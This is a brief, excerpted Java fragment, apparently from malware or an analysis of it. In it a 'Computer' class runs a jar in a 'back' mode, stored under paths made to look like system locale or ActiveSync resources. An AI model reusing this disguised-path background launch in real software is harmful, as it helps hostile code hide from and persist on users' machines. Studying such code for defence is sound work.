...
public class Computer {
    ...
    public void launchBack() {
        try {
            Runtime.getRuntime().exec(this.windows ? "java -Dfile.encoding=UTF8 -jar " + System.getenv("LOCALAPPDATA") + "\\Packages\\ActiveSync\\Locale\\resources.jar -mode back" : "java -Dfile.encoding=UTF8 -jar /bin/locales/resources.jar -mode back");
